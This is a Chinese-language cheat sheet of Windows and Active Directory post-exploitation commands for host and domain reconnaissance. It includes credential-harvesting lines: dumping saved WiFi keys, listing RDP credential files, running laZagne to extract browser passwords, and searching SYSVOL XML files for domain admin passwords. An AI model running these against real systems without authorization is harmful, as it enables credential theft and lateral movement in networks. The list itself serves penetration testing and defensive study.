# 当前主机信息搜集

## 常用信息搜集

+ whoami   # 查看当前用户

+ net user   # 查看所有用户

+ query user   # 查看当前在线用户

+ ipconfig /all   # 查看当前主机的主机名/IP/DNS等信息

+ route print   # 查看路由表信息

+ netstat -ano   # 查看端口开放情况

+ arp -a   # 查看arp解析情况

+ tasklist /svc   # 查看进程及对应服务名

+ net localgroup administrators   # 查看管理员组成员

+ systeminfo   # 查看系统信息含补丁信息

+ net use   # 查看ipc连接情况

+ net view   # 查看匿名共享情况

+ netsh firewall show state   # 查看防火墙状态

+ cmdkey /l   # 查看当前保存的登陆凭证

  

## 密码搜集

+ netsh wlan show profiles   # 查看连接过的wifi名称

+ netsh wlan show profile name="wifi名称" key=clear   # 查看wifi的密码

+ dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*   # 查看RDP连接凭证

+ dir /a /s /b "网站目录\\\*config\*" > 1.txt   # 数据库配置文件

+ laZagne.exe all -oN   # 本地wifi/浏览器等密码

+ dir %APPDATA%\Microsoft\Windows\Recent   # 查看最近打开的文档

## 连通性

+ ping www.baidu.com   # ICMP连通性

+ nslookup www.baidu.com   # DNS连通性

+ curl https://www.baidu.com   # http连通性

+ nc ip port   # TCP连通性


# 域信息搜集

## 常用信息搜集

+ net config workstation   #查看当前登录域

+ net user /domain   # 获得所有域用户列表

+ net view /domain   # 查看所有的域

+ net view /domain:XXX   # 查看域内某台主机详情

+ net group /domain   # 查看所有域用户组列表

+ net group "domain computers" /domain   # 查看域内所有的主机名

+ net group "domain admins" /domain   # 查看所有域管理员

+ net group "domain controllers" /domain   # 查看所有域控制器

+ net group "enterprise admins" /domain   # 查看所有企业管理员

+ nltest /domain_trusts   # 获取域信任信息

+ net time /domain   # 查看当前登录域

+ net accounts /domain   # 查看域密码策略

+ dsquery server   # 寻找目录中的域控制器

## 环境信息搜集

+ nbtscan.exe xx.xx.xx.xx/24   # 查看c段机器

+ csvde.exe -f 1.csv -k   # 批量导入/导出AD用户

+ setspn.exe -T xx.xx.xx.xx -Q */*   # 查看当前域内所有spn

## 密码搜集

+ dir /s /a \\域控IP\SYSVOL\*.xml   # 获取域里面所有机子的本地管理员账号密码
